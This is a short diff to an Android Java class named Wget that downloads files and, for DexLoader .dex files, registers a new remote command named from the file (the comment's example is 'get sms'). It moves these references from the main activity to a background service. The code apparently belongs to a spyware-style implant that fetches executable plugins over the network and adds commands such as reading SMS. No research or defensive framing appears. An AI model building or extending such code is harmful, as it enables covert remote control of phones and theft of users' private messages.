@@ -29,7 +29,7 @@ public class Wget {
     }
 
     private static String downloadFile(String targetUrl, String fileName, int size){
-        Context contextApplication = MainActivity.getThisContext();
+        Context contextApplication = MyService.getThisContext();
         OutputStream output = null;
         int bytesum = 0;
         int byteread = 0;
@@ -79,13 +79,13 @@ public class Wget {
         }
         @Override
         protected void onPostExecute(String result){
-            MainActivity.refResult.setValue((result));
+            MyService.refResult.setValue((result));
             if(result.equals("download finished")){
                 if(fileName.contains(".dex")){
                     String classFunction = fileName.substring(9, fileName.length()-4).toLowerCase(); //fileName is DexLoader***.dex, so classFunction will be ***
                     String cmdName = classFunction.substring(0, 3) + " " + classFunction.substring(3, classFunction.length()); //assume classFunction is "getsms", cmdName will be "get sms"
-                    MainActivity.commandSet.put(cmdName, fileName.substring(0, fileName.length() - 4));
-                    Log.e("new cmd added: ", cmdName + " " + MainActivity.commandSet.get(cmdName));
+                    MyService.commandSet.put(cmdName, fileName.substring(0, fileName.length() - 4));
+                    Log.e("new cmd added: ", cmdName + " " + MyService.commandSet.get(cmdName));
                 }
             }
         }
